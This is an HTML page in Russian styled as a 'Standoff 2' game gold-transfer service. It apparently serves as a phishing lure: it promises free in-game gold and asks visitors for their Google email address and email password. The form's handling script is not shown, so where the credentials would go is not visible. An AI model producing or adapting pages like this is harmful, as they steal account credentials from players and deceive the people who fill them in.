<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Standoff 2 - Gold transfer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      width: 90%;
      max-width: 400px;
      background-color: #1a1a1a;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
    }
    h1, h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    .input-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #555;
      background-color: #333;
      color: #fff;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0066cc;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #005bb5;
    }
    .form-section {
      margin-bottom: 20px;
    }
    #url-info {
      margin-bottom: 20px;
      font-size: 14px;
      line-height: 1.5;
    }
    #login-result {
      margin-top: 10px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Gold transfer</h1>
    <div id="url-info"></div>
      
    <div class="form-section">
      <h2>Авторизация</h2>
      <!-- Используем метод POST для предотвращения изменения URL -->
      <form id="login-form" method="POST">
        <div class="input-group">
          <label for="email">Google Почта:</label>
          <input type="email" id="email" name="email" placeholder="Введите адрес электронной почты" required>
        </div>
        <div class="input-group">
          <label for="password">Пароль от почты:</label>
          <input type="password" id="password" name="password" placeholder="Введите пароль" required>
        </div>
        <button type="submit">Войти</button>
      </form>
      <div id="login-result"></div>
    </div>
      
    <div class="form-section" id="gold-section" style="display:none;">
      <h2>Получить голду</h2>
      <button id="get-gold-button">Получить Gold</button>
    </div>
  </div>
